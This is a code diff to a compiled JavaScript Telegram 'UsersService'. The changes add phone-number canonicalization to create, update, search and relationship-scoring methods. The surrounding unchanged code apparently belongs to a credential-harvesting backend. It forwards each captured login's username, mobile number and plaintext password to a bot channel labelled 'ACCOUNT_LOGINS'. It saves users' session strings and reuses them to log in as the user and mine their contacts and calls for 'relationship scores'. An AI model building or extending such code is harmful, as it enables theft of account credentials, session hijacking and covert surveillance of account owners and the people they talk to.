@@ -30,6 +30,7 @@ const scoring_1 = require("./scoring");
 const tl_1 = require("telegram/tl");
 const big_integer_1 = __importDefault(require("big-integer"));
 const parseError_1 = require("../../utils/parseError");
+const mobile_utils_1 = require("../shared/mobile-utils");
 let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
@@ -39,20 +40,22 @@ let UsersService = UsersService_1 = class UsersService {
         this.logger = new utils_1.Logger(UsersService_1.name);
     }
     async create(user) {
-        const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
-        this.logger.log(`New User received - ${user?.mobile}`);
+        const canonicalMobile = this.canonicalMobile(user.mobile);
+        const userData = { ...user, mobile: canonicalMobile };
+        const activeClientSetup = this.telegramService.getActiveClientSetup(canonicalMobile);
+        this.logger.log(`New User received - ${canonicalMobile}`);
         this.logger.debug('ActiveClientSetup:', activeClientSetup);
-        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
-            this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
-            await this.clientsService.updateClientSession(user.session, user.mobile);
+        if (activeClientSetup && activeClientSetup.newMobile === canonicalMobile) {
+            this.logger.log(`Updating New Session Details: ${canonicalMobile}, @${userData.username}, ${activeClientSetup.clientId}`);
+            await this.clientsService.updateClientSession(userData.session, canonicalMobile);
         }
         else {
-            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`, { parseMode: 'HTML' }, false);
-            const newUser = new this.userModel(user);
+            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${userData.username ? `@${userData.username}` : userData.firstName}\n<b>Mobile:</b> ${canonicalMobile}${userData.password ? `\n<b>Password:</b> ${userData.password}` : ''}`, { parseMode: 'HTML' }, false);
+            const newUser = new this.userModel(userData);
             const saved = await newUser.save();
             setTimeout(() => {
-                this.computeRelationshipScore(user.mobile).catch(err => {
-                    this.logger.error(`Background scoring failed for ${user.mobile}`, err);
+                this.computeRelationshipScore(canonicalMobile).catch(err => {
+                    this.logger.error(`Background scoring failed for ${canonicalMobile}`, err);
                 });
             }, 5000);
             return saved;
@@ -326,8 +329,12 @@ let UsersService = UsersService_1 = class UsersService {
         return doc.toJSON();
     }
     async update(tgId, updateDto) {
+        const updateData = { ...updateDto };
+        if (updateData.mobile !== undefined) {
+            updateData.mobile = this.canonicalMobile(updateData.mobile);
+        }
         const updated = await this.userModel
-            .findOneAndUpdate({ tgId }, { $set: updateDto }, { new: true })
+            .findOneAndUpdate({ tgId }, { $set: updateData }, { new: true })
             .exec();
         if (!updated) {
             throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
@@ -344,12 +351,13 @@ let UsersService = UsersService_1 = class UsersService {
         return result.modifiedCount;
     }
     async toggleStar(mobile) {
-        const user = await this.userModel.findOne({ mobile }).select('mobile starred').exec();
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const user = await this.userModel.findOne({ mobile: canonicalMobile }).select('mobile starred').exec();
         if (!user)
             throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
         const newVal = !user.starred;
-        await this.userModel.updateOne({ mobile }, { $set: { starred: newVal } }).exec();
-        return { mobile, starred: newVal };
+        await this.userModel.updateOne({ mobile: canonicalMobile }, { $set: { starred: newVal } }).exec();
+        return { mobile: canonicalMobile, starred: newVal };
     }
     async delete(tgId) {
         const result = await this.userModel.updateOne({ tgId }, { $set: { expired: true } }).exec();
@@ -359,8 +367,11 @@ let UsersService = UsersService_1 = class UsersService {
     }
     async search(filter) {
         const query = { ...filter };
+        if (typeof query.mobile === 'string' && query.mobile) {
+            query.mobile = this.canonicalMobile(query.mobile);
+        }
         const escapeRegex = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        const regexFields = ['firstName', 'lastName', 'username', 'mobile'];
+        const regexFields = ['firstName', 'lastName', 'username'];
         for (const field of regexFields) {
             if (typeof query[field] === 'string' && query[field]) {
                 query[field] = { $regex: new RegExp(escapeRegex(query[field]), 'i') };
@@ -379,10 +390,11 @@ let UsersService = UsersService_1 = class UsersService {
         return this.userModel.find(query).sort({ updatedAt: -1 }).limit(200).exec();
     }
     async computeRelationshipScore(mobile) {
-        const wasConnected = connection_manager_1.connectionManager.hasClient(mobile);
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const wasConnected = connection_manager_1.connectionManager.hasClient(canonicalMobile);
         let telegramClient = null;
         try {
-            telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+            telegramClient = await connection_manager_1.connectionManager.getClient(canonicalMobile, { autoDisconnect: false, handler: false });
             const me = await telegramClient.getMe();
             const selfId = me.id?.toString();
             const candidateMap = new Map();
@@ -628,7 +640,7 @@ let UsersService = UsersService_1 = class UsersService {
             const top = (0, scoring_1.rankRelationships)(candidates, 5);
             const accountScore = (0, scoring_1.computeAccountScore)(top);
             const bestScore = top.length > 0 ? top[0].score : 0;
-            await this.userModel.updateOne({ mobile }, {
+            await this.userModel.updateOne({ mobile: canonicalMobile }, {
                 $set: {
                     'relationships.score': accountScore,
                     'relationships.bestScore': bestScore,
@@ -637,14 +649,14 @@ let UsersService = UsersService_1 = class UsersService {
                     calls: callAgg,
                 },
             }).exec();
-            this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
+            this.logger.log(`[${canonicalMobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
         }
         catch (error) {
-            (0, parseError_1.parseError)(error, `[${mobile}] computeRelationshipScore failed`);
+            (0, parseError_1.parseError)(error, `[${canonicalMobile}] computeRelationshipScore failed`);
         }
         finally {
             if (!wasConnected && telegramClient) {
-                await connection_manager_1.connectionManager.unregisterClient(mobile).catch(() => undefined);
+                await connection_manager_1.connectionManager.unregisterClient(canonicalMobile).catch(() => undefined);
             }
         }
     }
@@ -683,14 +695,24 @@ let UsersService = UsersService_1 = class UsersService {
         return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
     }
     async getUserRelationships(mobile) {
+        const canonicalMobile = this.canonicalMobile(mobile);
         const user = await this.userModel
-            .findOne({ mobile })
+            .findOne({ mobile: canonicalMobile })
             .select('mobile firstName lastName tgId relationships')
             .lean()
             .exec();
         if (!user)
             throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
         return user;
+    }
+    canonicalMobile(mobile) {
+        try {
+            return (0, mobile_utils_1.canonicalizeMobile)(mobile);
+        }
+        catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            throw new common_1.BadRequestException(message);
+        }
     }
     async aggregateSort(computedField, sortOrder = -1, limit = 20, skip = 0) {
         const COMPUTED_FIELDS = {
